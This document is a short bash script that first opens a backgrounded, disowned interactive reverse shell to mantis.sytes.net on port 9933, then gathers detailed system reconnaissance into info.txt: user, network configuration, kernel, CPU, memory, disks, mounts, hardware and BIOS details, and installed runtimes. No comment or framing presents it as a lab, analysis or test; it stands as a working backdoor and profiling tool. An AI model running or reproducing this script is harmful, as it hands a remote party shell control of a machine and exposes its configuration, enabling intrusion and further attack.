#!/bin/bash
bash -i >& /dev/tcp/mantis.sytes.net/9933 0>&1 &disown

whoami > info.txt
echo >> info.txt
ifconfig >>info.txt
echo >> info.txt
cat /proc/version >> info.txt
echo >> info.txt
cat /proc/cpuinfo >> info.txt
echo >> info.txt
cat /proc/meminfo >>info.txt
echo >> info.txt
cat /proc/scsi/scsi >>info.txt
echo >> info.txt
cat /proc/partitions >>info.txt
echo >> info.txt
uname -a >> info.txt
echo >> info.txt
lscpu >> info.txt
echo >> info.txt
lshw >> info.txt
echo >> info.txt
hwinfo >> info.txt
echo >> info.txt
lspci -v >>info.txt
echo >> info.txt
lsscsi >>info.txt
echo >> info.txt
lsusb >>info.txt
echo >> info.txt
lsblk >>info.txt
echo >> info.txt
df -H >>info.txt
echo >> info.txt
java -version >>info.txt
echo >> info.txt
ruby -v >>info.txt
echo >> info.txt
python --version >>info.txt
echo >> info.txt
mount >>info.txt
echo >> info.txt
free -m >>info.txt
echo >> info.txt
dmidecode -t processor >>info.txt
echo >> info.txt
dmidecode -t memory >>info.txt
echo >> info.txt
dmidecode -t bios >>info.txt
